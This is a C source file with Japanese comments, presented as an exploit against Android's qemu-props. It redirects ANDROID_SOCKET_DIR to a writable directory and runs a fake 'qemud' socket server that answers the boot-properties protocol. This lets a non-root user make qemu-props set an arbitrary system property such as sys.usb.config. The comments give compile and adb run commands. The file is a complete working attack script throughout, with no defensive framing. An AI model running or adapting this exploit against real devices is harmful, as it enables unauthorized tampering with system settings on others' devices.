/*
 * exploit_qemu_props_socket.c
 * 非root環境で ANDROID_SOCKET_DIR を乗っ取り、qemu-props に setprop を強制実行させる
 * コンパイル: aarch64-linux-android-gcc -static -o exploit exploit_qemu_props_socket.c
 * 実行: adb shell /data/local/tmp/exploit sys.usb.config mtp,adb
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>

#define SOCKET_DIR "/data/local/tmp"
#define SOCKET_PATH SOCKET_DIR "/qemud"
#define QEMU_PROPS_PATH "/system/bin/qemu-props"

void die(const char *msg) {
    perror(msg);
    exit(1);
}

// 偽サーバーを起動し、qemu-props とプロトコルを交換する
void run_fake_server(int listen_fd, const char *prop, const char *value) {
    int client_fd = accept(listen_fd, NULL, NULL);
    if (client_fd < 0) die("[-] accept failed");
    printf("[+] Fake server: client connected.\n");

    char buf[256];
    ssize_t n;

    // 1. "qemud:boot-properties" を受信
    n = read(client_fd, buf, sizeof(buf) - 1);
    if (n <= 0) die("[-] read failed (step 1)");
    buf[n] = '\0';
    printf("[*] Received: %s\n", buf);

    // 2. "OK" を送信 (アセンブラ 0xc48 ~ 0xc54 を満たす)
    if (write(client_fd, "OK", 2) != 2) die("[-] write OK failed");
    printf("[+] Sent OK\n");

    // 3. "list" を受信
    n = read(client_fd, buf, sizeof(buf) - 1);
    if (n <= 0) die("[-] read failed (step 2)");
    buf[n] = '\0';
    printf("[*] Received: %s\n", buf);

    // 4. ペイロード構築 & 送信
    char data[128];
    snprintf(data, sizeof(data), "%s=%s", prop, value);
    int data_len = strlen(data);

    char payload[256];
    snprintf(payload, sizeof(payload), "%04x%s", data_len, data);
    printf("[*] Sending payload: %s\n", payload);

    if (write(client_fd, payload, strlen(payload)) != (ssize_t)strlen(payload)) {
        die("[-] write payload failed");
    }
    printf("[+] Payload sent.\n");

    close(client_fd);
    close(listen_fd);
    printf("[!] Fake server finished.\n");
}

int main(int argc, char **argv) {
    char *prop = "sys.usb.config";
    char *value = "mtp";

    if (argc >= 3) {
        prop = argv[1];
        value = argv[2];
    }
    printf("[*] Target: %s = %s\n", prop, value);

    // 1. ソケットファイルを削除（前回の残骸除去）
    unlink(SOCKET_PATH);

    // 2. UNIXドメインソケットを作成（偽サーバー）
    int listen_fd = socket(AF_LOCAL, SOCK_STREAM, 0);
    if (listen_fd < 0) die("[-] socket creation failed");

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_LOCAL;
    strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    if (bind(listen_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        die("[-] bind failed (check directory permissions)");
    }
    if (listen(listen_fd, 5) < 0) die("[-] listen failed");
    printf("[+] Fake server listening on %s\n", SOCKET_PATH);

    // 3. 子プロセスで qemu-props を起動（環境変数をセット）
    pid_t pid = fork();
    if (pid == 0) {
        // 子：環境変数 ANDROID_SOCKET_DIR を書き換え
        setenv("ANDROID_SOCKET_DIR", SOCKET_DIR, 1);
        // デバッグ用に stderr を表示
        execl(QEMU_PROPS_PATH, "qemu-props", NULL);
        die("[-] execl failed");
    } else if (pid < 0) {
        die("[-] fork failed");
    }
    printf("[*] Spawned qemu-props (PID=%d). Waiting for connection...\n", pid);

    // 4. 親は偽サーバーとしてプロトコル処理
    run_fake_server(listen_fd, prop, value);

    // 5. 子プロセスの終了を待機
    int status;
    waitpid(pid, &status, 0);
    printf("[+] qemu-props finished (status=0x%04x)\n", status);

    // 6. 後片付け
    unlink(SOCKET_PATH);
    printf("[!] Done. Verify with: adb shell getprop %s\n", prop);
    return 0;
}
